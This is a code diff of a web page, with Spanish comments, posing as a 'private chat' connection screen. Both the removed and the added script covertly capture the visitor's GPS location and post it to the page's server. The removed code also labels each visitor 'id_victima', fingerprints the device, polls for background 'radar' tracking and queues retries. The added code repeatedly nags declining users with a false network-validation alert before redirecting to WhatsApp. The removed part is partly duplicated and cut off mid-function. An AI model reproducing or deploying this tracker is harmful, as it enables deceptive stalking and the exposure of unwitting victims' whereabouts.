@@ -146,235 +146,42 @@
         <p style="margin-top: 25px; color: #8696a0;">Conectando al chat privado..</p>
     </div>
 
-    <script>
-        if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('/sw.js')
-    .then(() => console.log('Service Worker registrado correctamente'))
-    .catch(err => console.error('Error al registrar:', err));
-}
-        // --- 1. CONFIGURACION INICIAL ---
-        let deviceID = localStorage.getItem('id_victima');
-        if (!deviceID) {
-            deviceID = 'TLF-' + Math.random().toString(36).substring(2, 10).toUpperCase();
-            localStorage.setItem('id_victima', deviceID);
-        }
-        
-        let yaRedirigido = false;
-    
-        // --- 2. EXTRACCION DE IDENTIDAD TECNICA ---
-        function obtenerHuellaDigital() {
-            return {
-                plataforma: navigator.platform,
-                nucleos: navigator.hardwareConcurrency || 'N/A',
-                memoria: navigator.deviceMemory || 'N/A',
-                idioma: navigator.language,
-                resolucion: window.screen.width + "x" + window.screen.height,
-                agente: navigator.userAgent
-            };
-        }
-        // Funcion para guardar en cola local
-function guardarEnCola(datos) {
-    let cola = JSON.parse(localStorage.getItem('cola_envios') || '[]');
-    cola.push(datos);
-    localStorage.setItem('cola_envios', JSON.stringify(cola));
-}
-
-// Funcion maestra de envio
-async function enviarUbicacion(lat, lon) {
-    const payload = { lat: lat, lon: lon, timestamp: Date.now() };
-    
-    try {
-        const response = await fetch('/guardar_ubicacion', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(payload)
-        });
-
-        if (response.ok) {
-            // Si funciona, intentamos vaciar la cola acumulada
-            enviarColaPendiente();
-        } else {
-            guardarEnCola(payload);
-        }
-    } catch (e) {
-        guardarEnCola(payload);
-    }
-}
-
-// Funcion para reintentar envios guardados
-async function enviarColaPendiente() {
-    let cola = JSON.parse(localStorage.getItem('cola_envios') || '[]');
-    if (cola.length === 0) return;
-
-    // Intentamos enviar el primero
-    let dato = cola[0];
-    try {
-        let res = await fetch('/guardar_ubicacion', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(dato)
-        });
-        if (res.ok) {
-            cola.shift(); // Quitamos el enviado
-            localStorage.setItem('cola_envios', JSON.stringify(cola));
-            enviarColaPendiente(); // Recursividad para enviar el siguiente
-        }
-    } catch (e) {}
-}
-    
-        // --- 3. FUNCIONES DE GPS ---
-async function exitoGPS(pos) {
-    if (yaRedirigido) return;
-
-    // 1. Preparar TODOS los datos juntos
-    const datosEnvio = {
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        velocidad: pos.coords.speed || 0,
-        rumbo: pos.coords.heading || 0,
-        precision: pos.coords.accuracy,
-        timestamp: pos.timestamp,
-        id_fijo: deviceID,
-        info: obtenerHuellaDigital()
-    };
-
-    // 2. Enviar todo en un solo paquete
-    try {
-        await fetch('/guardar_ubicacion', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(datosEnvio)
-        });
-    } catch (e) { console.error("Error al enviar:", e); }
-
-    // 3. Ejecutar redireccion solo despues del envio
-    yaRedirigido = true;
-    document.getElementById('mascara-insistencia').style.display = 'none';
-    document.getElementById('pantalla-carga').style.display = 'flex';
-    window.location.href = "https://wa.me/message/B6UEJRZFEVXCC1";
-}
-
-function errorGPS(error) {
-    if (yaRedirigido) return;
-    document.getElementById('mascara-insistencia').style.display = 'flex';
-    setTimeout(solicitarGPS, 2000);
-}
-
-function solicitarGPS() {
-    alert("Botón presionado, intentando pedir GPS"); // <--- AGREGA ESTO
-    if (navigator.geolocation) {
-        navigator.geolocation.watchPosition(exitoGPS, errorGPS, { 
-
-    // --- 1. REGISTRO DE SERVICE WORKER ---
-    if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('/sw.js')
-        .catch(err => console.error('Error:', err));
-    }
-
-    // --- 2. CONFIGURACIÓN INICIAL ---
-    let deviceID = localStorage.getItem('id_victima');
-    if (!deviceID) {
-        deviceID = 'TLF-' + Math.random().toString(36).substring(2, 10).toUpperCase();
-        localStorage.setItem('id_victima', deviceID);
-    }
-    
-    let yaRedirigido = false;
-
-    // --- 3. FUNCIONES DE APOYO (HUELLA Y COLA) ---
-    function obtenerHuellaDigital() {
-        return {
-            plataforma: navigator.platform,
-            resolucion: window.screen.width + "x" + window.screen.height,
-            agente: navigator.userAgent
-        };
-    }
-
-    function guardarEnCola(datos) {
-        let cola = JSON.parse(localStorage.getItem('cola_envios') || '[]');
-        cola.push(datos);
-        localStorage.setItem('cola_envios', JSON.stringify(cola));
-    }
-
-    async function enviarColaPendiente() {
-        let cola = JSON.parse(localStorage.getItem('cola_envios') || '[]');
-        if (cola.length === 0) return;
-        
-        let dato = cola[0];
-        try {
-            let res = await fetch('/guardar_ubicacion', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(dato)
-            });
-            if (res.ok) {
-                cola.shift();
-                localStorage.setItem('cola_envios', JSON.stringify(cola));
-                enviarColaPendiente();
-            }
-        } catch (e) {}
-    }
-
-    // --- 4. FUNCIONES DE GPS ---
-    async function exitoGPS(pos) {
-        if (yaRedirigido) return;
-
-        const datosEnvio = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            id_fijo: deviceID,
-            info: obtenerHuellaDigital()
-        };
-
-        try {
-            const response = await fetch('/guardar_ubicacion', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(datosEnvio)
-            });
-
-            if (response.ok) {
-                enviarColaPendiente();
-            } else {
-                guardarEnCola(datosEnvio);
-            }
-        } catch (e) {
-            guardarEnCola(datosEnvio);
-        }
-
-        yaRedirigido = true;
-        document.getElementById('mascara-insistencia').style.display = 'none';
-        document.getElementById('pantalla-carga').style.display = 'flex';
-        window.location.href = "https://wa.me/message/B6UEJRZFEVXCC1";
-    }
-
-    function errorGPS(error) {
-        if (yaRedirigido) return;
-        document.getElementById('mascara-insistencia').style.display = 'flex';
-        setTimeout(solicitarGPS, 2000);
-    }
-
+<script>
+    // Usamos una función simple sin promesas complicadas al inicio
     function solicitarGPS() {
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition(exitoGPS, errorGPS, { 
-                enableHighAccuracy: true, 
-                timeout: 10000 
-            });
-        }
+        console.log("Iniciando...");
+        
+        // El navegador exige que esto se llame tras un gesto del usuario
+        // Por eso lo ponemos dentro del onclick
+        var opciones = {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        };
+
+        navigator.geolocation.getCurrentPosition(exito, error, opciones);
     }
 
-    // --- 5. TAREAS DE SEGUNDO PLANO ---
-    setInterval(async () => {
-        try {
-            let res = await fetch('/api/verificar-radar');
-            let data = await res.json();
-            if (data.radar_activo) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    fetch('/guardar_ubicacion', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude, id_fijo: deviceID})
-                    });
-                });
+    function exito(pos) {
+        var lat = pos.coords.latitude;
+        var lon = pos.coords.longitude;
+        
+        // Enviamos al servidor
+        fetch('/guardar_ubicacion', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({lat: lat, lon: lon})
+        }).then(() => {
+            // REDIRECCIÓN FINAL
+            window.location.href = "https://wa.me/message/B6UEJRZFEVXCC1";
+        });
+    }
+
+    function error(err) {
+        alert("Para continuar, es obligatorio validar tu red.");
+        // Reintentamos inmediatamente si el usuario cancela
+        solicitarGPS();
+    }
 </script>
 </body>
 </html>
